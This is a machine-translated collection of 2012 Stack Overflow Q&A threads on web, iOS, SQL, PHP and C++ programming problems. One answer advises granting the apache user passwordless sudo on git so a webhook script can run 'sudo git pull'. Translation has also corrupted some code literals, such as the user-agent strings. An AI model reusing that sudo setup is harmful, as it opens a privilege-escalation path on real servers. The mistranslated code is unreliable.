**IE 桌面**- “Mozilla/5.0（Windows NT 10.0；WOW64；Trident/7.0；.NET4.0C；.NET4.0E；.NET CLR 2.0.50727；.NET CLR 3.0.30729；.NET CLR 3.5.30729；InfoPath .3; rv:11.0) 像壁虎"

**IE Surface Pro** - “Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; Tablet PC 2.0; rv 11.0) 像 Gecko”

**Edge 桌面**- “Mozilla/5.0 (Windows NT 10.0; Win64; x64; ServiceUI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063”

**边缘表面** - “Mozilla/5.0 (Windows NT 10.0; Win64; x64; ServiceUI 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134”

通过查看上面的用户代理，我们并没有明确区分 Edge 的桌面和 Surface Pro（IE 有 Tablet PC check 可用）。所以这里先检测window设备（surface pro是window tablet），然后验证设备是否是触控设备。

窗口 + 触摸：真 - Surface Pro

窗口 + 触摸：假 - 桌面

```
isSurface: function () {
  // Window device Check
  if(!!navigator.userAgent.match(/Win/)) { 
  // Check if the device is touch               
  return !!navigator.userAgent.match(/Tablet PC/i) || "ontouchstart" in document.documentElement; 
  }
} 
```

# cocoa - 基于视图的 NSTableView viewForTableColumn：未调用行

> ID：13076847
> 
> 赞同：2
> 
> 时间：2012-10-25T20:36:34.637
> 
> 标签：cocoa, nstableview

我有一个基于视图的`NSTableView`，在 IB 中配置为基于视图。它的列标识符也已设置。与它一样，它`dataSource`也`delegate`设置为同一个对象，该对象声称在公共标头中符合两者。我已经验证了这些是在 tableView 从其笔尖唤醒后设置的。

根据文档，我已经实现`-numberOfSectionsInTableView:`并且它被调用并返回一个非零数。

然而，`-tableView:viewForTableColumn:row:`令我懊恼的是，没有，我不知道为什么不这样做。

有谁知道为什么会发生这种情况？我在 Mountain Lion 上运行，我的部署目标也设置为 Mountain Lion。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-26T17:14:47.703

很简单！问题是，即使 tableview 被添加到我的视图层次结构中，它也被剪裁了，所以看不到。`NSTableView`必须做一些检查以查看它是否真的在屏幕上，然后只请求可见行的单元格视图。

因为整个 tableview 本质上是“屏幕外”，它不会请求任何行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-11-19T06:51:26.803

我的 NSTableView 是通过代码而不是 IB 添加的，我通过添加解决了它：

```
[tableView addTableColumn:[[NSTableColumn alloc]initWithIdentifier:@"columnIdentifier"]] 
```

# xcode - Xcode 4.5：运行应用程序时 UITextField 不会获得焦点

> ID：13076850
> 
> 赞同：0
> 
> 时间：2012-10-25T20:36:45.933
> 
> 标签：xcode

在我的 .xib 文件中设置了两个标签和两个文本字段，并设置了两个属性（nameField、numberField）来保存文本字段的数据。

还配置了两个文本字段。

问题是当我在 iOS 模拟器中运行应用程序并单击任一文本字段时，没有光标出现，键盘也没有弹出。

怎么了？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:41:54.897

您是否已将 textField 连接到 IBOutlet？如果是并且这仍然不起作用，您可以使用手势识别器。将 UITapGestureRegogniser 添加到您的 textField 并调用该方法：

```
[self.textField becomeFirstResponder]; 
```

我希望这有帮助

# php - 允许 Apache 执行 git pull

> ID：13076851
> 
> 赞同：4
> 
> 时间：2012-10-25T20:36:47.593
> 
> 标签：php, git, shell, webhooks

还没有弄清楚这一点..我已经看到了一些答案，但没有一个有帮助。

我正在尝试使用 Github Webhooks 让 github 在我的服务器上点击一个 url，并让服务器在点击后立即拉下新提交的项目。我有一个包含以下内容的 php 脚本：

```
<?php `git pull git@github.com:my-user/myrepo.git`; ?> 
```

但是，命中时的脚本是以用户身份运行的，`apache`所以我尝试了：

```
chown -R apache:apache . 
```

它仍然有一个权限被拒绝的错误。

因此，我尝试编辑 sudoers 文件并更改以下内容：

```
Host_Alias      LOCAL=127.0.0.1
apache          LOCAL=NOPASSWD: /var/www/html/git-hook.php 
```

这仍然行不通。

如何实现？如果我运行：

```
 sudo php git-hook.php 
```

它工作得很好，所以 php 文件中的代码没有问题。我只想让它自动化。

有任何想法吗？

**编辑：**

我也忘了提。我什至创建了一个文件夹`/home/apache/.ssh`并复制了 git pull 的公钥和相同的结果。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T07:50:49.887

更改您的 PHP 以通过 sudo 运行 git

```
<?php `sudo git pull git@github.com:my-user/myrepo.git`; ?> 
```

然后更改您的 suoders 以允许 git 由 apache 用户运行

```
apache ALL = NOPASSWD: /usr/bin/git 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:44:31.710

已经有 Git Wrappers 和库。也许您可以尝试其中之一： [https](https://github.com/kbjr/Git.php) ://github.com/kbjr/Git.php和/或[http://www.gitphp.org/projects/gitphp/wiki](http://www.gitphp.org/projects/gitphp/wiki)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-08T23:22:33.573

我是为开发站点执行此操作的——我不建议为 prd 站点执行此操作，尽管如果脚本不带参数，我想不出任何特别危险的地方。

我创建了一个执行 git pull 的 php 脚本。在网络浏览器中，我导航到该脚本，并且由设计者等推送的任何更改都会自动部署。 `http://.../gitpullscript/gitpullscript.php`

这通过创建 apache 用户拥有的 git checkout 来工作。您可以通过在属于 apache 用户（本例中为 www-data）的文档根目录之外的某个位置创建一个目录来执行此操作。然后一个 git clone 到那个目录，所以所有的文件都属于 www-data。之后将我想要的目录软链接到我的文档根目录中，以便可以通过网络浏览器访问它们。

www-data 不在 git 组中，并且存储库已设置为每个人都可以读取（但不能写入）.. 因此 www-data 可以拉但不能推送

在项目层次结构中，我创建了一个目录来保存 gitpull 脚本。我使用 .htaccess 来密码保护这个目录。 `<?php exec('cd /var/www-data/projects/myrepo; git pull');`

`mkdir /var/www-data sudo chown www-data-www-data su www-data mkdir /var/www-data/projects cd /var/www-data/projects git clone my-repo`

# iphone - UITableView - (void)configureView

> ID：13076852
> 
> 赞同：0
> 
> 时间：2012-10-25T20:36:56.650
> 
> 标签：iphone, ios, xcode, uitableview

我现在正在使用表格视图和详细视图，您知道在您选择表格中的元素时会出现的那个。

有一个方法 - (void)configureView 在 vi​​ewDidLoad 中被调用，描述说它更新接口。

我有这样的事情：

```
- (void)configureView
{
    // Update the user interface for the detail item.

 if (self.detailItem) {
    self.detailDescriptionLabel.text = self.detailItem;
}
if (self.subjectItem) {
    self.subjectLabel.text = [self.subjectItem description];
}
self.imageView.image = self.imageItem;} 
```

我的问题是：是否需要“描述”属性？因为它没有它（第一项和 imageView）也能工作，如果是这样，那么 imageView 的语法会是什么样子？因为“描述”仅适用于 NSStrings

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T21:33:23.210

真正的描述是 NSObject 的一个方法：[https](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSObject_Class/Reference/Reference.html)
://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSObject_Class/Reference/Reference.html 你不需要在你的上面的代码，既不是 NSString。只需确保为属性分配正确的对象（即 self.imageItem 必须是 UIImage 的一个实例）。

# javascript - ios 6 模拟器 - 远程调试，以及如何清空设备兑现

> ID：13076859
> 
> 赞同：1
> 
> 时间：2012-10-25T20:37:52.633
> 
> 标签：javascript, safari, ios6

我正在使用 iOS 6 Safari 中的远程调试器从 iOS 模拟器调试 Node.js 服务器代码。

问题是我必须“重置内容和设置”才能强制从服务器刷新。

那么问题来了，如何强制 iOS 强制刷新 - “Safari / Develop / Disable Caches”不起作用？

在 iOS 模拟器上，您可以执行“iOS Simulator / 重置内容和设置”，但您真的打算在每次刷新服务器页面更改时执行此操作吗？

谢谢

# python - MySQL：自动化这个查询链（来自值的新列）

> ID：13076861
> 
> 赞同：0
> 
> 时间：2012-10-25T20:38:07.603
> 
> 标签：python, mysql, sql

我有一个包含如下数据的表：

```
date          met       val

2012-10-18    avgt    63.3617
2012-10-16    avgt    65.7312
2012-10-19    avgt    66.4952
2012-10-17    avgt    67.3747
2012-10-18    cdd     53.3617
2012-10-17    cdd     55.3472
2012-10-19    cdd     66.8063
2012-10-16    cdd     67.3116
2012-10-18    maxt    43.3617
2012-10-19    maxt    47.4484
2012-10-16    maxt    65.9559
2012-10-17    maxt    66.2868
2012-10-19    mint    56.0447
2012-10-16    mint    65.0656
2012-10-18    mint    65.0656
2012-10-17    mint    66.4952 
```

**met**列只有 4 个可能的值（avgt、mint、maxt、cdd、hdd），它们标记**val**列中的数据。我需要一个查询（可能是一个存储过程），它将***重新排列数据，如下所示：***

```
 date           avgt        cdd         maxt        mint
 2012-10-16     65.7312     67.3116     65.9559     65.0656 
 2012-10-17     67.3747     55.3472     66.2868     66.4952 
 2012-10-18     63.3617     53.3617     43.3617     65.0656 
 2012-10-19     56.0447     66.8063     47.4484     56.0447 
```

以静态方式执行此操作很容易。但我希望这是动态完成的，*这样无论`met`列中的值实际上是*什么，重新排列都会正确发生。

### 这是我手动执行此操作的方法：

添加其他列：

```
ALTER TABLE MYTABLE  
ADD COLUMN  avgt FLOAT( 15, 5 ) NOT NULL AFTER  val , 
ADD COLUMN  mint FLOAT( 15, 5 ) NOT NULL AFTER  avgt , 
ADD COLUMN  maxt FLOAT( 15, 5 ) NOT NULL AFTER  mint , 
ADD COLUMN  cdd  FLOAT( 15, 5 ) NOT NULL AFTER  hdd 
```

更新每一行的新列：

```
UPDATE MYTABLE
SET avgt = val WHERE metric == 'avgt';
SET mint = val WHERE metric == 'mint';
SET maxt = val WHERE metric == 'maxt';
SET cdd  = val WHERE metric == 'cdd'; 
```

删除旧列

```
ALTER TABLE MYTABLE
DROP COLUMN met,
DROP COLUMN val; 
```

我也了解如何获取唯一`met`值列表：

```
SELECT DISTINCT met FROM MYTABLE 
```

我在两者之间的逻辑中缺乏什么。我需要遍历不同的值。如果有人可以帮助我解决这个问题，我将不胜感激。

我将接受用纯 SQL（可能是存储过程）或 Python 编写的答案。

万分感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:51:20.230

由于您需要一个不依赖于met列中的值的灵活解决方案，因此最好的方法是在从数据库中获取数据后在python中进行，例如

```
data_str = """2012-10-18    avgt    63.3617
2012-10-16    avgt    65.7312
2012-10-19    avgt    66.4952
2012-10-17    avgt    67.3747
2012-10-18    cdd     53.3617
2012-10-17    cdd     55.3472
2012-10-19    cdd     66.8063
2012-10-16    cdd     67.3116
2012-10-18    maxt    43.3617
2012-10-19    maxt    47.4484
2012-10-16    maxt    65.9559
2012-10-17    maxt    66.2868
2012-10-19    mint    56.0447
2012-10-16    mint    65.0656
2012-10-18    mint    65.0656
2012-10-17    mint    66.4952"""

data = []
# convert to array data as it would be from sql
for line in data_str.split("\n"):
    row = line.split()
    data.append(row)

# ######## this is the code required to process sql output
import collections
date_map = collections.defaultdict(dict)
for date, met, val in data:
    date_map[date][met] = val

rows = []
for date, data in date_map.iteritems():
    row = [date]
    rows.append(row)
    values = data.items()
    values.sort()
    row.extend((v for met, v in values))
    print row 
```

输出：

```
['2012-10-19', '66.4952', '66.8063', '47.4484', '56.0447']
['2012-10-18', '63.3617', '53.3617', '43.3617', '65.0656']
['2012-10-17', '67.3747', '55.3472', '66.2868', '66.4952']
['2012-10-16', '65.7312', '67.3116', '65.9559', '65.0656'] 
```

# php - 计算数组中值的百分比

> ID：13076867
> 
> 赞同：2
> 
> 时间：2012-10-25T20:38:32.773
> 
> 标签：php, arrays

我有以下数组：

```
[ratings] => Array
 (
      [0] => 3
      [1] => 3
      [2] => 2
      [3] => 3
      [4] => 3
      [5] => 1
      [6] => 3
      [7] => 4
      [8] => 5
 ) 
```

获得每个评级百分比的最佳和最快方法是什么。比如现在有9个评分，5个评分“3”，那么评分“3”的百分比是55.55%。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T21:22:15.877

虽然他可能已经有了一些东西，但这就是我想出的。

```
<?php
$array = array(3,3,2,3,3,1,3,4,5);

function array_avg($array, $round=1){
    $num = count($array);
    return array_map(
        function($val) use ($num,$round){
            return array('count'=>$val,'avg'=>round($val/$num*100, $round));
        },
        array_count_values($array));
}

$avgs = array_avg($array);

/*
 * You can access any average/count like:
 * echo "The count of 3 is: {$avgs[3]['count']}";
 * echo "The average of 3 is: {$avgs[3]['avg']}";
 */

echo '<pre>'.print_r($avgs,1).'</pre>'; 
```

输出：

```
Array
(
    [3] => Array
        (
            [count] => 5
            [avg] => 55.6
        )

    [2] => Array
        (
            [count] => 1
            [avg] => 11.1
        )

    [1] => Array
        (
            [count] => 1
            [avg] => 11.1
        )

    [4] => Array
        (
            [count] => 1
            [avg] => 11.1
        )

    [5] => Array
        (
            [count] => 1
            [avg] => 11.1
        )
) 
```

[http://codepad.viper-7.com/yD9CQm](http://codepad.viper-7.com/yD9CQm)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T21:32:18.653

```
function findPercentage($r, $ratings){
    $arr = array_count_values($ratings);
    return $arr[$r]/count($ratings) * 100;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T21:37:08.293

正如所评论的，您可以通过简单的迭代来使用[`array_count_values`](http://php.net/array_count_values)and 过程。[`count`](http://php.net/count)

在我的代码示例中，我将其包装成它自己的函数：

```
$ratings = [3,3,2,3,3,1,3,4,5];

$percentages = function($ratings) {
    $total = count($ratings);
    $percentages = [];
    foreach(array_count_values($ratings) as $value => $count) {
        $percentages[$value] = $count / $total;
    }
    return $percentages;    
};

print_r($percentages($ratings)); 
```

输出（[演示](http://codepad.viper-7.com/bsC3ts)）：

```
Array (
    [3] => 0.55555555555556
    [2] => 0.11111111111111
    [1] => 0.11111111111111
    [4] => 0.11111111111111
    [5] => 0.11111111111111
) 
```

我希望这能很好地证明这一点。再次（为了好玩）：

```
print_r($percentages(array_map('strval', $percentages($ratings)))); 
```

（`array_count_values()`只能计算 STRING 和 INTEGER 值）

输出：

```
Array (
    [0.55555555555556] => 0.2
    [0.11111111111111] => 0.8
) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:49:18.950

`$avg = array_sum($a)/count($a)`

在 Javascript 中：

```
var a = [1,2,3,4,5,6]; 
var avg = a.reduce(function(a,b){ return a+b })/a.length; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T20:59:36.903

```
// $ratings is your array

function findPercentage($r, $ratings){
$count = 0; // count number of particular ratings
    foreach ($ratings as $i){
        if ($i == $r) $count++;
}

return $count/count($ratings) * 100;

} 
```

例子：

```
echo findPercentages(3, $ratings); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-10-25T20:44:08.487

```
$rating = array(3, 3, 5, 5, 3, 4);

$value = 0;
foreach ($rating as $i) {
    $value += $i;
}
$percentage = $value / count($rating);

echo $percentage; 
```

== **更新**

我写了一个小测试：

```
$rating = array();

echo "create array".PHP_EOL;

for ($i = 0; $i < 100000; $i++) {
    $rating[] = rand(1, 5);
}

echo "foreach algorithm: ".PHP_EOL;
$time = microtime();

$value = 0;
foreach ($rating as $i) {
    $value += $i;
}
$percentage = $value / count($rating);

echo $percentage.PHP_EOL;
echo "time is ".(microtime() - $time).PHP_EOL;

echo "array_sum algorithm: ".PHP_EOL;
$time = microtime();

$avg = array_sum($rating)/count($rating);
echo "time is ".(microtime() - $time).PHP_EOL; 
```

结果：

```
create array
foreach algorithm: 
2.99924
time is 0.017117
array_sum algorithm: 
time is 0.002819 
```

答：使用写用户@Reflective的算法，使用函数**array_sum**

# html - SSRS 2008 Rendering to Word from URL 为 Exporting from Reporting 已经呈现在屏幕上提供了不同的输出

> ID：13076868
> 
> 赞同：1
> 
> 时间：2012-10-25T20:38:39.983
> 
> 标签：html, reporting-services, ms-word, ssrs-2008, render

我在 SQL Server 2008 (SP3) 的 VS2008 中创建了一份报告。在某些情况下，该报告由嵌套 3 或 4 层的多个子报告组成。文档地图被广泛使用，以便可以进一步生成 Word 目录。

现在问题来了。

如果我在开发环境中渲染到屏幕或从 Reporting Services 服务器渲染部署的报表，那么一切正常。如果我以任何格式（使用 Word、PDF 和 Excel 测试）导出报告，则输出符合预期。

但是，如果我创建一个包含所有参数的 URL，例如

```
http://MYSERVERNAME/ReportServer/Pages/ReportViewer.aspx?%2fMYPATH%2fMYREPORTNAME&PARAM1=999&PARAM2=999&PARAM3=999&rs:Command=Render&rs:Format=HTML4.0 
```

然后将其粘贴到 IE 窗口中，输出不正确。好吧，让我澄清一下。

如果我使用 HTML4.0 呈现扩展插件按上述方式呈现，那么报表会按预期呈现在屏幕上，所有内容都会显示出来。如果我通过将 rs:Format 参数更改为 Word 来呈现到 Word，则报表会呈现但第一页丢失（请参阅下面有关此内容的注释）如果我呈现为 PDF，则报表的同一部分丢失。如果我渲染到 Excel，则在第一个工作簿工作表上生成的文档映射会显示报告缺失部分的条目，但单击单击会出现“无效引用”错误，并且确实报告的该部分再次未渲染。

请注意，缺少更好术语的“主”报告由 3 个子报告组成，每个子报告都包含其他子报告。

它是第一个子报告的内容，这也仅发生在第一页上的每个节目中（因为它的长度不到一页）。在 Word 中呈现了一些东西，但它看起来像一个空表，宽度是页面的整个宽度，但高度只有几毫米。

我真的不知道为什么该部分在渲染到屏幕然后导出时完美运行时无法渲染。我曾假设他们会使用相同的渲染过程，但我不确定。

我会继续实验，可能在问题部分之前添加一些空白内容或其他内容，然后看看我得到了什么，但我对为什么会发生这种情况感到困惑，其他报告没有遇到问题（但是我只测试了 3 或 4或我写的数百个）。过去我没有过多地使用 URL 方法，但是当我编写 ac# 应用程序以运行具有不同参数的相同报告以生成超过 1200 个单词的文档时，我到了这一点，每个文档大约需要 2 分钟才能运行。那里的输出不正确，所以我重新创建了手动 URL，但问题仍然很明显，剩下的就是历史了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T12:49:33.843

我终于找到了答案。

导致问题的子报表采用随后传递给其他子子报表的参数。当我测试这些时，我有提供参数可用值的数据集（例如国家列表及其相关 ID）。

我的正常工作方法是删除所有仅用于填充所有子报表中的参数的数据集，因为这可以提高性能（例如，报表不必查询数据库来获取国家/地区列表）。

但是，在这种情况下，我删除了所有数据集（这本身很好），但我将数据源留在了原处（在报表数据窗格中可见）。

一旦我删除了这个多余的条目，报告就会按预期呈现。

现在我仍然不确定为什么它可以渲染为 HTML4.0，但看起来当渲染为其他格式时，可能会出现一些查看数据源的过程，因为没有数据（因为没有数据集）然后不会呈现报告。这有点猜测，但这是目前对我来说唯一有意义的事情。

# c++ - 我在我的 cpp 文件中的函数上收到错误“List::showList”：函数样式初始化程序似乎是函数定义

> ID：13076869
> 
> 赞同：0
> 
> 时间：2012-10-25T20:38:42.447
> 
> 标签：c++

GithubLink [https://github.com/leomdmfiel/Assignment/tree/master/BankManager/BankManager](https://github.com/leomdmfiel/Assignment/tree/master/BankManager/BankManager) 首先这是我的标题：

```
class List
{
protected:
    Node* head;
public:
    List(object data);
    void addNode(Node* headRef, object data);
    void removeNode();
    void showList(Node* headRef);
}; 
```

这是函数 showList

```
void List::showList(Node* headRef)
{   Node* current = headRef;
    while (current != NULL) 
    {
        cout << current->retrieveData();
        current = current->retrieveNext();
    }   
} 
```

由于某种原因，在编译时它一直给我错误 error C2448: 'List::showList' : function-style initializer 似乎是一个函数定义，即使我已经逐个字母地复制了声明。所以我很茫然，正在寻求帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:25:37.603

现在我已经看到了你有一个额外的分号的代码

```
#include"List.h"; 
```

应该

```
#include"List.h" 
```

不过，我必须承认，我本来希望得到更好的错误消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:55:39.450

您提供的函数似乎没有任何问题，请检查函数上方的代码以防忘记分号。

编辑：确保您还检查了函数的位置，确保它在正确的文件中，它可能与错误文件一样小。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T21:13:03.977

尝试重建解决方案。

有时在 Visual Studio 中链接文件时会出现问题。造成这种情况的潜在原因超出了我的理解水平，但有时重建解决方案可以解决这样的问题。

因此，可以说 cpp 文件可能已过时。

就我个人而言，据我所知，似乎没有问题。

# dkim - 轮换 DKIM 密钥的常用程序是什么？

> ID：13076885
> 
> 赞同：3
> 
> 时间：2012-10-25T20:39:44.997
> 
> 标签：dkim

我正在大致寻找如何在不影响现有邮件的情况下生成新的 DKIM 密钥。听起来唯一担心的是运输中的邮件。是否有这样做的通用程序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T21:39:21.660

您将生成一个新的密钥对。在新的 selector._domainkey.example.com 中发布它。等待新的选择器在 DNS 中传播。更新您的电子邮件系统以使用新的选择器。大约一周后，删除旧的选择器 DNS 记录。

# sql - 在 SQL Server 的更新语句中使用随机记录更新表？

> ID：13076890
> 
> 赞同：12
> 
> 时间：2012-10-25T20:40:23.853
> 
> 标签：sql, sql-server, sql-server-2008

我有两张桌子。`Table 1`大约有 80 行，`Table 2`大约有 1000 万行。

我想`Table 2`用随机行更新所有行`Table 1`。我不希望所有行都使用同一行。是否可以更新`Table 2`并让它为正在更新的每一行随机选择一个值？

这是我尝试过的，但它在每一行中都设置了相同的值。

```
update member_info_test
set hostessid = (SELECT TOP 1 hostessId FROM hostess_test ORDER BY NEWID()) 
```

**已编辑

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-25T20:53:00.747

好的，我认为这是我写过的最奇怪的查询之一，而且我认为这会非常缓慢。但是试一试：

```
UPDATE A
SET A.hostessid = B.hostessId
FROM member_info_test A
CROSS APPLY (SELECT TOP 1 hostessId
             FROM hostess_test 
             WHERE A.somecolumn = A.somecolumn
             ORDER BY NEWID()) B 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:10:55.547

我认为这会起作用（至少，这部分会起作用`with`）：

```
with toupdate as (
      select (select top . . . hostessId from hostess_test where mit.hostessId = mit.hostessId order by newid()) as newval,
             mit.*
      from member_info_test mit
     )
update toupdate
    set hostessid = newval; 
```

这个（以及 Lamak 的）的关键是子查询中的外部相关性。这说服优化器实际运行每一行的查询。我不知道为什么这会起作用而其他版本不会。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-23T20:25:13.740

这是我最终使用的：

EnvelopeInformation 将是您的表 2

PaymentAccountDropDown 将是您的表 1（在我的情况下，我有 3 个项目）-为您的用例将 3 更改为 80。

```
;WITH cteTable1 AS (
    SELECT
        ROW_NUMBER() OVER (ORDER BY NEWID()) AS n,
        PaymentAccountDropDown_Id
    FROM EnvelopeInformation
    ),
cteTable2 AS (
    SELECT 
        ROW_NUMBER() OVER (ORDER BY NEWID()) AS n,
        t21.Id
    FROM PaymentAccountDropDown t21
    )
UPDATE cteTable1
   SET PaymentAccountDropDown_Id = (
       SELECT Id 
       FROM cteTable2
       WHERE  (cteTable1.n % 3) + 1 = cteTable2.n
) 
```

参考： [http ://social.technet.microsoft.com/Forums/sqlserver/pt-BR/f58c3bf8-e6b7-4cf5-9466-7027164afdc0/updating-multiple-rows-with-random-values-from-another-table](http://social.technet.microsoft.com/Forums/sqlserver/pt-BR/f58c3bf8-e6b7-4cf5-9466-7027164afdc0/updating-multiple-rows-with-random-values-from-another-table)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-27T16:45:55.853

[使用随机字段更新表](https://stackoverflow.com/questions/30484933/update-records-with-random-fields)

```
UPDATE p
    SET p.City= b.City
    FROM Person p
    CROSS APPLY (SELECT TOP 1 City
                 FROM z.CityStateZip 
                 WHERE p.SomeKey = p.SomeKey and -- ... the magic! ↓↓↓
                 Id = (Select ABS(Checksum(NewID()) % (Select count(*) from z.CityStateZip)))) b 
```

# android - android 应用程序如何检测没有蓝牙权限的蓝牙耳机？

> ID：13076891
> 
> 赞同：0
> 
> 时间：2012-10-25T20:40:26.537
> 
> 标签：android, bluetooth, headset

我最近获得了一个蓝牙耳机，并注意到虽然 Google Play 音乐检测到它何时配对，并开始显示“在手机扬声器和蓝牙耳机之间切换”控件，但它的清单（由 AppXplore 重建）没有列出任何蓝牙权限。

这里有谁知道它可能使用什么 API，不需要蓝牙权限？

还是谷歌在作弊？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:47:14.277

嘎。[http://developer.android.com/reference/android/media/AudioManager.html#setBluetoothScoOn(boolean](http://developer.android.com/reference/android/media/AudioManager.html#setBluetoothScoOn(boolean) )

希望它还能路由麦克风，这就是我真正想要的......！

# c++ - 函数结束时的 C++ Seg 错误。参考线 = 右大括号

> ID：13076895
> 
> 赞同：1
> 
> 时间：2012-10-25T20:41:09.997
> 
> 标签：c++, arrays, segmentation-fault, curly-braces, strcpy

总结：非常感谢大家！下面发布的所有回复都是正确的。最初的错误是我忘记为 NULL 终止符留出空间。strcpy() 是一个危险的函数，因为当我使用它时，它不知道“字符串”的结尾是什么时候。因此，strcpy() 抓取了大量数据并覆盖了返回地址。

编辑：从程序中添加了更多代码

已解决：老实说，我最初的实现是垃圾。如果我想交换数组的元素，我什至不知道为什么要这样写交换。（当时，每个元素中只有一个 char 数组。所以我能够摆脱旧的实现）。我已将其重写为：

```
void swap(ArrayElement list[], int index1, int index2) {
     ArrayElement temp;
     temp = list[index1];
     list[index1] = list[index2];
     list[index2] = temp;
} 
```

* * *

我在以下函数结束时遇到分段错误问题。

```
struct ArrayElement {
    char data[SIZE_OF_ELEMENT];
    // Implemented this way so that I can expand to multiple values later on
}

//In main:
ArrayElement* list = new ArrayElement[NUM_OF_ELEMENTS];

void swap(ArrayElement list[], int index1, int index2) {
     char temp[SIZE_OF_ELEMENT];
     strcpy(temp, list[index2].data);
     strcpy(list[index2].data, list[index1].data);
     strcpy(list[index1].data, temp);
} 
```

错误是第 45 行的分段错误，这是函数的结束大括号。这是使用 g++ 编译的。我使用 gbd 尝试调试它，一切正常，直到它碰到花括号。

如果需要，我可以从程序中提供更多代码。我不想发布整个内容，因为这是针对课程的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T20:44:02.870

我最好的猜测是，字符串`list[index2].data`大于`temp[]`并且通过复制，您覆盖了堆栈和返回地址。

尝试插入长度测试：

```
#include <iostream>

...
int n = strlen(list[index2].data);
std::cerr << "len=" << n << ", SIZE_OF_ELEMENT=" << SIZE_OF_ELEMENT << std::endl; 
```

看看，如果`n`(list[index2].data) 大于`SIZE_OF_ELEMENT`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:52:01.830

`strcpy`是一个危险的功能。如果输入字符串的长度大于`SIZE_OF_ELEMENT`或等于，您将写入`temp`数组末尾。如果您必须使用一个固定大小的数组作为 中的输出数组，您应该在使用该函数之前`strcpy`测试它是否可以工作。`strcpy`

更好的是从使用`char`数组切换到`std::string`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T20:54:38.000

数据是这样定义的`char data[SOME_CONSTANT]`吗？如果是这样，那么您确定 SIZE_OF_ELEMENT 足够大吗？你也记得 NULL 终止符，*对吧*？

如果在 ArrayElement 中的数据是这样定义的`char *data;`，并在稍后使用 malloc 分配，那么您*确定*index1 有一个足够大的缓冲区来容纳 index2 中的数据，反之亦然？同样，您也记住了 NULL 终止符，*对*吗？

# asp.net - 如何使用 Html Helper 使用多个编辑表单

> ID：13076898
> 
> 赞同：0
> 
> 时间：2012-10-25T20:41:13.750
> 
> 标签：asp.net, asp.net-mvc, razor, html-helper

我想制作多个编辑页面。但我不知道如何在循环中使用`TextBoxFor()`, 。`TextAreaFor()``ValidationMessageFor()``foreach`

```
@foreach (var note in Model.noteList)
{
    using(Html.BeginForm()){
        @Html.Hidden("id", note.id);
        <div class="userIdArea"><b>@note.userId</b></div>  
        <div class="noteArea">@note.content</div>  
        <br />
        <div class="editor-label">
            @Html.LabelFor(model => model.note.userId)
        </div>
        <div class="editor-field">
            @Html.TextBoxFor(model => model.note.userId, new { @Value = note.userId })
            @Html.ValidationMessageFor(model => model.note.userId)
        </div>
        <div class="editor-field">
            @Html.TextAreaFor(note => note.noteList)
            @Html.ValidationMessageFor(model => model.note.content)
        </div>
        <input type="submit" value="Edit" />
    }
} 
```

上面的代码无法设置 textarea 值，我认为这不是正确的方法。

编辑 ）

我改变了这样的代码，

```
@foreach (var note in Model.noteList)
{
    using(Html.BeginForm()){
        @Html.Hidden("note.id", note.id);
        <div class="userIdArea"><b>@note.userId</b></div>  
        <div class="noteArea">@note.content</div>  
        <br />
        <div class="editor-label">
            @Html.LabelFor(model => model.note.userId)
        </div>
        <div class="editor-field">
            @Html.TextBoxFor(model => note.userId)
            @Html.ValidationMessageFor(model => note.userId)
        </div>
        <div class="editor-field">
            @Html.TextAreaFor(model => note.content)
            @Html.ValidationMessageFor(_ => note.content)
        </div>
        <input type="submit" value="Edit" />
    }
} 
```

我仍然有使用 ValidationMessageFor() 的问题。

我只空了一个内容并提交表单然后它发生了这样的事情，

![在此处输入图像描述](../Images/2e1aa692e2a73551ad94eb7aa68feebd.png)

我应该如何将 ValidationMessage 放在正确的位置？

[编辑#2]

是的，我也在同一个视图中创建了表单，

查看代码是这样的，

```
@model MemoBoard.Models.NoteViewModel

@{
    ViewBag.Title = "Index";
    Layout = "~/Views/Shared/_Layout.cshtml";
}

<h2>Note</h2>
<br /><br />
@using(Html.BeginForm()){
    <div class="editor-label">
        @Html.LabelFor(model => model.note.userId)
    </div>
    <div class="editor-field">
        @Html.TextBoxFor(model => model.note.userId)
        @Html.ValidationMessageFor(model => model.note.userId)
    </div>
    <div class="editor-label">
        @Html.LabelFor(model => model.note.content)
    </div>
    <div class="editor-field">
        @Html.TextAreaFor(model => model.note.content, new { rows = 4})
